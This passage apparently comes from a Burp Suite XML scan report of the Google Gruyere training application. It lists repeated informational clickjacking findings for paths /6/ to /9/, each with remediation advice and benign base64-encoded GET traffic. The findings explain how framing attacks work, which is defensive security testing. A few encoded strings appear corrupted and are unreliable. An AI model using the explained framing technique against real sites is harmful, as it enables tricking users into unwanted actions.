      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpDYWNoZS1Db250cm9sOiBuby1jYWNoZQ0KUHJhZ21hOiBuby1jYWNoZQ0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7IGNoYXJzZXQ9dXRmLTgNClgtQ2xvdWQtVHJhY2UtQ29udGV4dDogNTk0YTdhNWJjZmY0MGM4NTJkYTFiNDI0Y2EwMGMwMzgNClZhcnk6IEFjY2VwdC1FbmNvZGluZw0KRGF0ZTogVGh1LCAxOCBKYW4gMjAxOCAwOTozNzozNCBHTVQNClNlcnZlcjogR29vZ2xlIEZyb250ZW5kDQpDb250ZW50LUxlbmd0aDogMzU5DQpDb25uZWN0aW9uOiBjbG9zZQ0KDQoKICAgIDxIVE1MPgogIDxTVFlMRT4KICBib2R5LCB0aCwgdGQsIGZvcm0gewogICAgZm9udC1mYW1pbHk6IFZlcmRhbmEsIEFyaWFsLCBIZWx2ZXRpY2EsIHNhbnMtc2VyaWY7CiAgICBmb250LXNpemU6IDEycHg7CiAgfQogIGgxIHsgY29sb3I6ICNkZDAwMDA7IH0KICA8L1NUWUxFPgogICAgPFRJVExFPkdydXllcmUgRXJyb3I8L1RJVExFPgogICAgPEJPRFk+CiAgICA8SDE+R3J1eWVyZSBFcnJvcjwvSDE+CiAgICBUaGF0IGluc3RhbmNlIGRvZXMgbm90IGV4aXN0LgogICAgPEgyPjxBIGhyZWY9Ii8iPkhvbWU8L0E+PC9IMj4KICAgIDxIMj48QSBocmVmPSIvc3RhcnQiPlN0YXJ0PC9BPjwvSDI+CiAgICA8L0JPRFk+PC9IVE1MPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>7340141752886342656</serialNumber>
    <type>5245344</type>
    <name><![CDATA[Frameable response (potential Clickjacking)]]></name>
    <host ip="172.217.25.52">http://google-gruyere.appspot.com</host>
    <path><![CDATA[/6/]]></path>
    <location><![CDATA[/6/]]></location>
    <severity>Information</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>If a page fails to set an appropriate X-Frame-Options or Content-Security-Policy HTTP header, it might be possible for a page controlled by an attacker to load it within an iframe. This may enable a clickjacking attack, in which the attacker's page overlays the target application's interface with a different interface provided by the attacker. By inducing victim users to perform actions such as mouse clicks and keystrokes, the attacker can cause them to unwittingly carry out actions within the application that is being targeted. This technique allows the attacker to circumvent defenses against cross-site request forgery, and may result in unauthorized actions.</p>
<p>Note that some applications attempt to prevent these attacks from within the HTML page itself, using "framebusting" code. However, this type of defense is normally ineffective and can usually be circumvented by a skilled attacker.</p>
<p>You should determine whether any functions accessible within frameable pages can be used by application users to perform any sensitive actions within the application. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>To effectively prevent framing attacks, the application should return a response header with the name <b>X-Frame-Options</b> and the value <b>DENY</b> to prevent framing altogether, or the value <b>SAMEORIGIN</b> to allow framing only by pages on the same origin as the response itself. Note that the SAMEORIGIN header can be partially bypassed if the application itself can be made to frame untrusted websites.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/X-Frame-Options">X-Frame-Options</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/693.html">CWE-693: Protection Mechanism Failure</a></li>
</ul>]]></vulnerabilityClassifications>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC82LyBIVFRQLzEuMQ0KSG9zdDogZ29vZ2xlLWdydXllcmUuYXBwc3BvdC5jb20NCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZQ0KQWNjZXB0OiAqLyoNCkFjY2VwdC1MYW5ndWFnZTogZW4NClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChjb21wYXRpYmxlOyBNU0lFIDkuMDsgV2luZG93cyBOVCA2LjE7IFdpbjY0OyB4NjQ7IFRyaWRlbnQvNS4wKQ0KQ29ubmVjdGlvbjogY2xvc2UNClJlZmVyZXI6IGh0dHA6Ly9nb29nbGUtZ3J1eWVyZS5hcHBzcG90LmNvbS9yb2JvdHMudHh0DQoNCg==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpDYWNoZS1Db250cm9sOiBuby1jYWNoZQ0KUHJhZ21hOiBuby1jYWNoZQ0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7IGNoYXJzZXQ9dXRmLTgNClgtQ2xvdWQtVHJhY2UtQ29udGV4dDogZWE1OTYzkwNTEzOGZjMDBiNTg3NDUwYjVlMzhiMDINClZhcnk6IEFjY2VwdC1FbmNvZGluZw0KRGF0ZTogVGh1LCAxOCBKYW4gMjAxOCAwOTozODoxNCBHTVQNClNlcnZlcjogR29vZ2xlIEZyb250ZW5kDQpDb250ZW50LUxlbmd0aDogMzU5DQpDb25uZWN0aW9uOiBjbG9zZQ0KDQoKICAgIDxIVE1MPgogIDxTVFlMRT4KICBib2R5LCB0aCwgdGQsIGZvcm0gewogICAgZm9udC1mYW1pbHk6IFZlcmRhbmEsIEFyaWFsLCBIZWx2ZXRpY2EsIHNhbnMtc2VyaWY7CiAgICBmb250LXNpemU6IDEycHg7CiAgfQogIGgxIHsgY29sb3I6ICNkZDAwMDA7IH0KICA8L1NUWUxFPgogICAgPFRJVExFPkdydXllcmUgRXJyb3I8L1RJVExFPgogICAgPEJPRFk+CiAgICA8SDE+R3J1eWVyZSBFcnJvcjwvSDE+CiAgICBUaGF0IGluc3RhbmNlIGRvZXMgbm90IGV4aXN0LgogICAgPEgyPjxBIGhyZWY9Ii8iPkhvbWU8L0E+PC9IMj4KICAgIDxIMj48QSBocmVmPSIvc3RhcnQiPlN0YXJ0PC9BPjwvSDI+CiAgICA8L0JPRFk+PC9IVE1MPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>8953741367002527744</serialNumber>
    <type>5245344</type>
    <name><![CDATA[Frameable response (potential Clickjacking)]]></name>
    <host ip="172.217.25.52">http://google-gruyere.appspot.com</host>
    <path><![CDATA[/7]]></path>
    <location><![CDATA[/7]]></location>
    <severity>Information</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>If a page fails to set an appropriate X-Frame-Options or Content-Security-Policy HTTP header, it might be possible for a page controlled by an attacker to load it within an iframe. This may enable a clickjacking attack, in which the attacker's page overlays the target application's interface with a different interface provided by the attacker. By inducing victim users to perform actions such as mouse clicks and keystrokes, the attacker can cause them to unwittingly carry out actions within the application that is being targeted. This technique allows the attacker to circumvent defenses against cross-site request forgery, and may result in unauthorized actions.</p>
<p>Note that some applications attempt to prevent these attacks from within the HTML page itself, using "framebusting" code. However, this type of defense is normally ineffective and can usually be circumvented by a skilled attacker.</p>
<p>You should determine whether any functions accessible within frameable pages can be used by application users to perform any sensitive actions within the application. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>To effectively prevent framing attacks, the application should return a response header with the name <b>X-Frame-Options</b> and the value <b>DENY</b> to prevent framing altogether, or the value <b>SAMEORIGIN</b> to allow framing only by pages on the same origin as the response itself. Note that the SAMEORIGIN header can be partially bypassed if the application itself can be made to frame untrusted websites.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/X-Frame-Options">X-Frame-Options</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/693.html">CWE-693: Protection Mechanism Failure</a></li>
</ul>]]></vulnerabilityClassifications>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC83IEhUVFAvMS4xDQpIb3N0OiBnb29nbGUtZ3J1eWVyZS5hcHBzcG90LmNvbQ0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlDQpBY2NlcHQ6ICovKg0KQWNjZXB0LUxhbmd1YWdlOiBlbg0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKGNvbXBhdGlibGU7IE1TSUUgOS4wOyBXaW5kb3dzIE5UIDYuMTsgV2luNjQ7IHg2NDsgVHJpZGVudC81LjApDQpDb25uZWN0aW9uOiBjbG9zZQ0KUmVmZXJlcjogaHR0cDovL2dvb2dsZS1ncnV5ZXJlLmFwcHNwb3QuY29tL3JvYm90cy50eHQNCg0K]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpDYWNoZS1Db250cm9sOiBuby1jYWNoZQ0KUHJhZ21hOiBuby1jYWNoZQ0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7IGNoYXJzZXQ9dXRmLTgNClgtQ2xvdWQtVHJhY2UtQ29udGV4dDogZGQ4MWRiNGM3MmJjYWY2MTdmNzhiNTZmOGIwYzIwYjENClZhcnk6IEFjY2VwdC1FbmNvZGluZw0KRGF0ZTogVGh1LCAxOCBKYW4gMjAxOCAwOTozODoxNyBHTVQNClNlcnZlcjogR29vZ2xlIEZyb250ZW5kDQpDb250ZW50LUxlbmd0aDogMzU5DQpDb25uZWN0aW9uOiBjbG9zZQ0KDQoKICAgIDxIVE1MPgogIDxTVFlMRT4KICBib2R5LCB0aCwgdGQsIGZvcm0gewogICAgZm9udC1mYW1pbHk6IFZlcmRhbmEsIEFyaWFsLCBIZWx2ZXRpY2EsIHNhbnMtc2VyaWY7CiAgICBmb250LXNpemU6IDEycHg7CiAgfQogIGgxIHsgY29sb3I6ICNkZDAwMDA7IH0KICA8L1NUWUxFPgogICAgPFRJVExFPkdydXllcmUgRXJyb3I8L1RJVExFPgogICAgPEJPRFk+CiAgICA8SDE+R3J1eWVyZSBFcnJvcjwvSDE+CiAgICBUaGF0IGluc3RhbmNlIGRvZXMgbm90IGV4aXN0LgogICAgPEgyPjxBIGhyZWY9Ii8iPkhvbWU8L0E+PC9IMj4KICAgIDxIMj48QSBocmVmPSIvc3RhcnQiPlN0YXJ0PC9BPjwvSDI+CiAgICA8L0JPRFk+PC9IVE1MPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>70929413082372096</serialNumber>
    <type>5245344</type>
    <name><![CDATA[Frameable response (potential Clickjacking)]]></name>
    <host ip="172.217.25.52">http://google-gruyere.appspot.com</host>
    <path><![CDATA[/7/]]></path>
    <location><![CDATA[/7/]]></location>
    <severity>Information</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>If a page fails to set an appropriate X-Frame-Options or Content-Security-Policy HTTP header, it might be possible for a page controlled by an attacker to load it within an iframe. This may enable a clickjacking attack, in which the attacker's page overlays the target application's interface with a different interface provided by the attacker. By inducing victim users to perform actions such as mouse clicks and keystrokes, the attacker can cause them to unwittingly carry out actions within the application that is being targeted. This technique allows the attacker to circumvent defenses against cross-site request forgery, and may result in unauthorized actions.</p>
<p>Note that some applications attempt to prevent these attacks from within the HTML page itself, using "framebusting" code. However, this type of defense is normally ineffective and can usually be circumvented by a skilled attacker.</p>
<p>You should determine whether any functions accessible within frameable pages can be used by application users to perform any sensitive actions within the application. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>To effectively prevent framing attacks, the application should return a response header with the name <b>X-Frame-Options</b> and the value <b>DENY</b> to prevent framing altogether, or the value <b>SAMEORIGIN</b> to allow framing only by pages on the same origin as the response itself. Note that the SAMEORIGIN header can be partially bypassed if the application itself can be made to frame untrusted websites.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/X-Frame-Options">X-Frame-Options</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/693.html">CWE-693: Protection Mechanism Failure</a></li>
</ul>]]></vulnerabilityClassifications>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC83LyBIVFRQLzEuMQ0KSG9zdDogZ29vZ2xlLWdydXllcmUuYXBwc3BvdC5jb20NCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZQ0KQWNjZXB0OiAqLyoNCkFjY2VwdC1MYW5ndWFnZTogZW4NClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChjb21wYXRpYmxlOyBNU0lFIDkuMDsgV2luZG93cyBOVCA2LjE7IFdpbjY0OyB4NjQ7IFRyaWRlbnQvNS4wKQ0KQ29ubmVjdGlvbjogY2xvc2UNClJlZmVyZXI6IGh0dHA6Ly9nb29nbGUtZ3J1eWVyZS5hcHBzcG90LmNvbS9yb2JvdHMudHh0DQoNCg==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpDYWNoZS1Db250cm9sOiBuby1jYWNoZQ0KUHJhZ21hOiBuby1jYWNoZQ0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7IGNoYXJzZXQ9dXRmLTgNClgtQ2xvdWQtVHJhY2UtQ29udGV4dDogOThmMzc0MGU2YTZmODYwY2Y5NTVjZWMyMzU1ZjZkMWUNClZhcnk6IEFjY2VwdC1FbmNvZGluZw0KRGF0ZTogVGh1LCAxOCBKYW4gMjAxOCAwOTozODoyMiBHTVQNClNlcnZlcjogR29vZ2xlIEZyb250ZW5kDQpDb250ZW50LUxlbmd0aDogMzU5DQpDb25uZWN0aW9uOiBjbG9zZQ0KDQoKICAgIDxIVE1MPgogIDxTVFlMRT4KICBib2R5LCB0aCwgdGQsIGZvcm0gewogICAgZm9udC1mYW1pbHk6IFZlcmRhbmEsIEFyaWFsLCBIZWx2ZXRpY2EsIHNhbnMtc2VyaWY7CiAgICBmb250LXNpemU6IDEycHg7CiAgfQogIGgxIHsgY29sb3I6ICNkZDAwMDA7IH0KICA8L1NUWUxFPgogICAgPFRJVExFPkdydXllcmUgRXJyb3I8L1RJVExFPgogICAgPEJPRFk+CiAgICA8SDE+R3J1eWVyZSBFcnJvcjwvSDE+CiAgICBUaGF0IGluc3RhbmNlIGRvZXMgbm90IGV4aXN0LgogICAgPEgyPjxBIGhyZWY9Ii8iPkhvbWU8L0E+PC9IMj4KICAgIDxIMj48QSBocmVmPSIvc3RhcnQiPlN0YXJ0PC9BPjwvSDI+CiAgICA8L0JPRFk+PC9IVE1MPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>5892436687299877888</serialNumber>
    <type>5245344</type>
    <name><![CDATA[Frameable response (potential Clickjacking)]]></name>
    <host ip="172.217.25.52">http://google-gruyere.appspot.com</host>
    <path><![CDATA[/8]]></path>
    <location><![CDATA[/8]]></location>
    <severity>Information</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>If a page fails to set an appropriate X-Frame-Options or Content-Security-Policy HTTP header, it might be possible for a page controlled by an attacker to load it within an iframe. This may enable a clickjacking attack, in which the attacker's page overlays the target application's interface with a different interface provided by the attacker. By inducing victim users to perform actions such as mouse clicks and keystrokes, the attacker can cause them to unwittingly carry out actions within the application that is being targeted. This technique allows the attacker to circumvent defenses against cross-site request forgery, and may result in unauthorized actions.</p>
<p>Note that some applications attempt to prevent these attacks from within the HTML page itself, using "framebusting" code. However, this type of defense is normally ineffective and can usually be circumvented by a skilled attacker.</p>
<p>You should determine whether any functions accessible within frameable pages can be used by application users to perform any sensitive actions within the application. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>To effectively prevent framing attacks, the application should return a response header with the name <b>X-Frame-Options</b> and the value <b>DENY</b> to prevent framing altogether, or the value <b>SAMEORIGIN</b> to allow framing only by pages on the same origin as the response itself. Note that the SAMEORIGIN header can be partially bypassed if the application itself can be made to frame untrusted websites.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/X-Frame-Options">X-Frame-Options</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/693.html">CWE-693: Protection Mechanism Failure</a></li>
</ul>]]></vulnerabilityClassifications>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC84IEhUVFAvMS4xDQpIb3N0OiBnb29nbGUtZ3J1eWVyZS5hcHBzcG90LmNvbQ0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlDQpBY2NlcHQ6ICovKg0KQWNjZXB0LUxhbmd1YWdlOiBlbg0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKGNvbXBhdGlibGU7IE1TSUUgOS4wOyBXaW5kb3dzIE5UIDYuMTsgV2luNjQ7IHg2NDsgVHJpZGVudC81LjApDQpDb25uZWN0aW9uOiBjbG9zZQ0KUmVmZXJlcjogaHR0cDovL2dvb2dsZS1ncnV5ZXJlLmFwcHNwb3QuY29tL3JvYm90cy50eHQNCkNvb2tpZTogR1JVWUVSRV9JRD00MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYNCg0K]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpDYWNoZS1Db250cm9sOiBuby1jYWNoZQ0KUHJhZ21hOiBuby1jYWNoZQ0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7IGNoYXJzZXQ9dXRmLTgNClgtQ2xvdWQtVHJhY2UtQ29udGV4dDogYmQxZDM5NDBkYTJkODQ2ZDhkNmYwOGFkZWY3ZGM5YmMNClZhcnk6IEFjY2VwdC1FbmNvZGluZw0KRGF0ZTogVGh1LCAxOCBKYW4gMjAxOCAwOTozODoyNCBHTVQNClNlcnZlcjogR29vZ2xlIEZyb250ZW5kDQpDb250ZW50LUxlbmd0aDogMzU5DQpDb25uZWN0aW9uOiBjbG9zZQ0KDQoKICAgIDxIVE1MPgogIDxTVFlMRT4KICBib2R5LCB0aCwgdGQsIGZvcm0gewogICAgZm9udC1mYW1pbHk6IFZlcmRhbmEsIEFyaWFsLCBIZWx2ZXRpY2EsIHNhbnMtc2VyaWY7CiAgICBmb250LXNpemU6IDEycHg7CiAgfQogIGgxIHsgY29sb3I6ICNkZDAwMDA7IH0KICA8L1NUWUxFPgogICAgPFRJVExFPkdydXllcmUgRXJyb3I8L1RJVExFPgogICAgPEJPRFk+CiAgICA8SDE+R3J1eWVyZSBFcnJvcjwvSDE+CiAgICBUaGF0IGluc3RhbmNlIGRvZXMgbm90IGV4aXN0LgogICAgPEgyPjxBIGhyZWY9Ii8iPkhvbWU8L0E+PC9IMj4KICAgIDxIMj48QSBocmVmPSIvc3RhcnQiPlN0YXJ0PC9BPjwvSDI+CiAgICA8L0JPRFk+PC9IVE1MPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>1735258949601738752</serialNumber>
    <type>5245344</type>
    <name><![CDATA[Frameable response (potential Clickjacking)]]></name>
    <host ip="172.217.25.52">http://google-gruyere.appspot.com</host>
    <path><![CDATA[/8/]]></path>
    <location><![CDATA[/8/]]></location>
    <severity>Information</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>If a page fails to set an appropriate X-Frame-Options or Content-Security-Policy HTTP header, it might be possible for a page controlled by an attacker to load it within an iframe. This may enable a clickjacking attack, in which the attacker's page overlays the target application's interface with a different interface provided by the attacker. By inducing victim users to perform actions such as mouse clicks and keystrokes, the attacker can cause them to unwittingly carry out actions within the application that is being targeted. This technique allows the attacker to circumvent defenses against cross-site request forgery, and may result in unauthorized actions.</p>
<p>Note that some applications attempt to prevent these attacks from within the HTML page itself, using "framebusting" code. However, this type of defense is normally ineffective and can usually be circumvented by a skilled attacker.</p>
<p>You should determine whether any functions accessible within frameable pages can be used by application users to perform any sensitive actions within the application. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>To effectively prevent framing attacks, the application should return a response header with the name <b>X-Frame-Options</b> and the value <b>DENY</b> to prevent framing altogether, or the value <b>SAMEORIGIN</b> to allow framing only by pages on the same origin as the response itself. Note that the SAMEORIGIN header can be partially bypassed if the application itself can be made to frame untrusted websites.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/X-Frame-Options">X-Frame-Options</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/693.html">CWE-693: Protection Mechanism Failure</a></li>
</ul>]]></vulnerabilityClassifications>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC84LyBIVFRQLzEuMQ0KSG9zdDogZ29vZ2xlLWdydXllcmUuYXBwc3BvdC5jb20NCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZQ0KQWNjZXB0OiAqLyoNCkFjY2VwdC1MYW5ndWFnZTogZW4NClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChjb21wYXRpYmxlOyBNU0lFIDkuMDsgV2luZG93cyBOVCA2LjE7IFdpbjY0OyB4NjQ7IFRyaWRlbnQvNS4wKQ0KQ29ubmVjdGlvbjogY2xvc2UNClJlZmVyZXI6IGh0dHA6Ly9nb29nbGUtZ3J1eWVyZS5hcHBzcG90LmNvbS9yb2JvdHMudHh0DQpDb29raWU6IEdSVVlFUkVfSUQ9NDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2DQoNCg==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpDYWNoZS1Db250cm9sOiBuby1jYWNoZQ0KUHJhZ21hOiBuby1jYWNoZQ0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7IGNoYXJzZXQ9dXRmLTgNClgtQ2xvdWQtVHJhY2UtQ29udGV4dDogMmNmZmVkMDI3Y2E1NmJmOTViMWVmZjc2NDNiMWEzNDkNClZhcnk6IEFjY2VwdC1FbmNvZGluZw0KRGF0ZTogVGh1LCAxOCBKYW4gMjAxOCAwOTozODoyOCBHTVQNClNlcnZlcjogR29vZ2xlIEZyb250ZW5kDQpDb250ZW50LUxlbmd0aDogMzU5DQpDb25uZWN0aW9uOiBjbG9zZQ0KDQoKICAgIDxIVE1MPgogIDxTVFlMRT4KICBib2R5LCB0aCwgdGQsIGZvcm0gewogICAgZm9udC1mYW1pbHk6IFZlcmRhbmEsIEFyaWFsLCBIZWx2ZXRpY2EsIHNhbnMtc2VyaWY7CiAgICBmb250LXNpemU6IDEycHg7CiAgfQogIGgxIHsgY29sb3I6ICNkZDAwMDA7IH0KICA8L1NUWUxFPgogICAgPFRJVExFPkdydXllcmUgRXJyb3I8L1RJVExFPgogICAgPEJPRFk+CiAgICA8SDE+R3J1eWVyZSBFcnJvcjwvSDE+CiAgICBUaGF0IGluc3RhbmNlIGRvZXMgbm90IGV4aXN0LgogICAgPEgyPjxBIGhyZWY9Ii8iPkhvbWU8L0E+PC9IMj4KICAgIDxIMj48QSBocmVmPSIvc3RhcnQiPlN0YXJ0PC9BPjwvSDI+CiAgICA8L0JPRFk+PC9IVE1MPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>1264715667093079040</serialNumber>
    <type>5245344</type>
    <name><![CDATA[Frameable response (potential Clickjacking)]]></name>
    <host ip="172.217.25.52">http://google-gruyere.appspot.com</host>
    <path><![CDATA[/9]]></path>
    <location><![CDATA[/9]]></location>
    <severity>Information</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>If a page fails to set an appropriate X-Frame-Options or Content-Security-Policy HTTP header, it might be possible for a page controlled by an attacker to load it within an iframe. This may enable a clickjacking attack, in which the attacker's page overlays the target application's interface with a different interface provided by the attacker. By inducing victim users to perform actions such as mouse clicks and keystrokes, the attacker can cause them to unwittingly carry out actions within the application that is being targeted. This technique allows the attacker to circumvent defenses against cross-site request forgery, and may result in unauthorized actions.</p>
<p>Note that some applications attempt to prevent these attacks from within the HTML page itself, using "framebusting" code. However, this type of defense is normally ineffective and can usually be circumvented by a skilled attacker.</p>
<p>You should determine whether any functions accessible within frameable pages can be used by application users to perform any sensitive actions within the application. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>To effectively prevent framing attacks, the application should return a response header with the name <b>X-Frame-Options</b> and the value <b>DENY</b> to prevent framing altogether, or the value <b>SAMEORIGIN</b> to allow framing only by pages on the same origin as the response itself. Note that the SAMEORIGIN header can be partially bypassed if the application itself can be made to frame untrusted websites.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/X-Frame-Options">X-Frame-Options</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/693.html">CWE-693: Protection Mechanism Failure</a></li>
</ul>]]></vulnerabilityClassifications>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUICIEhUVFAvMS4xDQpIb3N0OiBnb29nbGUtZ3J1eWVyZS5hcHBzcG90LmNvbQ0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlDQpBY2NlcHQ6ICovKg0KQWNjZXB0LUxhbmd1YWdlOiBlbg0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKGNvbXBhdGlibGU7IE1TSUUgOS4wOyBXaW5kb3dzIE5UIDYuMTsgV2luNjQ7IHg2NDsgVHJpZGVudC81LjApDQpDb25uZWN0aW9uOiBjbG9zZQ0KUmVmZXJlcjogaHR0cDovL2dvb2dsZS1ncnV5ZXJlLmFwcHNwb3QuY29tL3JvYm90cy50eHQNCkNvb2tpZTogR1JVWUVSRV9JRD00MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYNCg0K]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpDYWNoZS1Db250cm9sOiBuby1jYWNoZQ0KUHJhZ21hOiBuby1jYWNoZQ0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7IGNoYXJzZXQ9dXRmLTgNClgtQ2xvdWQtVHJhY2UtQ29udGV4dDogYWY0M2Y5ZTQ1MDZlMDE5ZDY3NzZkNjBkODhmOGYxNmENClZhcnk6IEFjY2VwdC1FbmNvZGluZw0KRGF0ZTogVGh1LCAxOCBKYW4gMjAxOCAwOTozODozMSBHTVQNClNlcnZlcjogR29vZ2xlIEZyb250ZW5kDQpDb250ZW50LUxlbmd0aDogMzU5DQpDb25uZWN0aW9uOiBjbG9zZQ0KDQoKICAgIDxIVE1MPgogIDxTVFlMRT4KICBib2R5LCB0aCwgdGQsIGZvcm0gewogICAgZm9udC1mYW1pbHk6IFZlcmRhbmEsIEFyaWFsLCBIZWx2ZXRpY2EsIHNhbnMtc2VyaWY7CiAgICBmb250LXNpemU6IDEycHg7CiAgfQogIGgxIHsgY29sb3I6ICNkZDAwMDA7IH0KICA8L1NUWUxFPgogICAgPFRJVExFPkdydXllcmUgRXJyb3I8L1RJVExFPgogICAgPEJPRFk+CiAgICA8SDE+R3J1eWVyZSBFcnJvcjwvSDE+CiAgICBUaGF0IGluc3RhbmNlIGRvZXMgbm90IGV4aXN0LgogICAgPEgyPjxBIGhyZWY9Ii8iPkhvbWU8L0E+PC9IMj4KICAgIDxIMj48QSBocmVmPSIvc3RhcnQiPlN0YXJ0PC9BPjwvSDI+CiAgICA8L0JPRFk+PC9IVE1MPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>2798136459157665792</serialNumber>
    <type>5245344</type>
    <name><![CDATA[Frameable response (potential Clickjacking)]]></name>
    <host ip="172.217.25.52">http://google-gruyere.appspot.com</host>
    <path><![CDATA[/9/]]></path>
    <location><![CDATA[/9/]]></location>
    <severity>Information</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>If a page fails to set an appropriate X-Frame-Options or Content-Security-Policy HTTP header, it might be possible for a page controlled by an attacker to load it within an iframe. This may enable a clickjacking attack, in which the attacker's page overlays the target application's interface with a different interface provided by the attacker. By inducing victim users to perform actions such as mouse clicks and keystrokes, the attacker can cause them to unwittingly carry out actions within the application that is being targeted. This technique allows the attacker to circumvent defenses against cross-site request forgery, and may result in unauthorized actions.</p>
<p>Note that some applications attempt to prevent these attacks from within the HTML page itself, using "framebusting" code. However, this type of defense is normally ineffective and can usually be circumvented by a skilled attacker.</p>
<p>You should determine whether any functions accessible within frameable pages can be used by application users to perform any sensitive actions within the application. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>To effectively prevent framing attacks, the application should return a response header with the name <b>X-Frame-Options</b> and the value <b>DENY</b> to prevent framing altogether, or the value <b>SAMEORIGIN</b> to allow framing only by pages on the same origin as the response itself. Note that the SAMEORIGIN header can be partially bypassed if the application itself can be made to frame untrusted websites.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/X-Frame-Options">X-Frame-Options</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/693.html">CWE-693: Protection Mechanism Failure</a></li>
</ul>]]></vulnerabilityClassifications>
    <requestresponse>
